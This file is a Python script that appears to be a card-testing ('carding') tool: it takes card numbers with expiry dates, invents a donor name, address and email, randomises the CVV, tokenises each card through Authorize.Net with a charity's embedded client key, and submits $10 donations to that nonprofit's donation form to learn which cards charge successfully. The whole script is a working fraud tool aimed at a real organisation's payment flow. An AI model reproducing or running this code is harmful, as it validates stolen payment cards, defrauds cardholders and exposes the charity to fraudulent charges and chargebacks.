import requests
import json
import random
import string
import threading
# Optimized mail generation function
def generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "vyy.eu"]
    email_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{email_prefix}@{random.choice(domains)}"

# Optimized function to extract a substring between two delimiters
def find_between(data, first, last):
    start = data.find(first)
    if start == -1:
        return None
    start += len(first)
    end = data.find(last, start)
    return data[start:end] if end != -1 else None

# Session for making requests
session = requests.Session()

def authnet1small(card):
    first_name = "William"
    last_name = "West"
    email = generate_email()
    address1 = "29 Willington street"
    city = "New York"
    zip_code = "10080"
    cc, mes, ano, cvv = card.split("|")
    mesano = f"{mes}{ano}"
    cvv = random.randint(000, 999)
    # Fetching the wp_dono URL
    wp_data = session.get("https://azzcaresfoundation.org/?givewp-route=donation-form-view&form-id=3390").text
    wp_dono = find_between(wp_data, '"donateUrl":"', '"').replace(r"\/", "/")
    #print(f"Donate URL: {wp_dono}")

    # Authorize.Net request data
    data = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": "2Pra9HJx34E",
                "clientKey": "3nc4xj3Ym9kc339JeVDjxNZvmFw4Q77fcKEmcZsWpX9yfF3Gy99Kk9u7bWhLRsHK"
            },
            "data": {
                "type": "TOKEN",
                "id": "71a87c5c-119a-281f-ca6f-33d0741b13b1",
                "token": {
                    "cardNumber": f"{cc}",
                    "expirationDate": f"{mesano}",
                    "cardCode": f"{cvv}"
                }
            }
        }
    }

    # Request to Authorize.Net API
    auth_response = session.post("https://api2.authorize.net/xml/v1/request.api", json=data)
    try:
        authval = json.loads(auth_response.content.decode('utf-8-sig'))['opaqueData']['dataValue']
    except Exception as e:
        print("authnet1 issue ❌ (failed)")
        return
    #print(f"Authorization Value: {authval}")

    # Prepare the form data as a single string using join() to optimize string concatenation
    form_data_parts = [
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"formId\"\n\n3390",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"amount\"\n\n10",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"currency\"\n\nUSD",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"donationType\"\n\nsingle",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"gatewayId\"\n\nauthorize",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"firstName\"\n\n{first_name}",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"lastName\"\n\n{last_name}",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"email\"\n\n{email}",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"country\"\n\nUS",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"address1\"\n\n{address1}",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"address2\"\n\n ",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"city\"\n\n{city}",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"state\"\n\nNY",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"zip\"\n\n{zip_code}",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"donationBirthday\"\n\n ",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"originUrl\"\n\nhttps://azzcaresfoundation.org/donate/",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"isEmbed\"\n\ntrue",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"embedId\"\n\ngive-form-shortcode-1",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "Content-Disposition: form-data; name=\"gatewayData[give_authorize_data_descriptor]\"\n\nCOMMON.ACCEPT.INAPP.PAYMENT",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr",
        f"Content-Disposition: form-data; name=\"gatewayData[give_authorize_data_value]\"\n\n{authval}",
        "------WebKitFormBoundarypuTvz0GkbBV1PMvr--"
    ]

    data = "\n".join(form_data_parts)

    # Prepare headers for the POST request
    headers = {
        "authority": "azzcaresfoundation.org",
        "method": "POST",
        "accept": "application/json",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypuTvz0GkbBV1PMvr",
        "origin": "https://azzcaresfoundation.org",
        "referer": "https://azzcaresfoundation.org/?givewp-route=donation-form-view&form-id=3390",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
    }

    # Final POST request to send the donation data
    donation_response = session.post(wp_dono, data=data, headers=headers)
#
    # Check the server response
    if '"type":"redirect"' in donation_response.text or '"success":"' in donation_response.text:
        print("authnet1small responded ✅ (success)") #print(f"Processing, cvv:{cvv}\n") #print("≿━━━༺❀༻━━━≾\n[✦] Sapphire Killer Auth.net 6969$ (G1)\n[✦] Request succeeded ✅\n≿━━━༺❀༻━━━≾")
    elif '"success":"true"' in donation_response.text or '"success":"True"' in donation_response.text:
        print("≿━━━༺❀༻━━━≾\n[✦] Authnet1small: Charged ✅\n≿━━━༺❀༻━━━≾")
    else:
        print("≿━━━༺❀༻━━━≾\n[✦] Authnet1small: Request failed ❌\n≿━━━༺❀༻━━━≾")
        print(donation_response.text)
#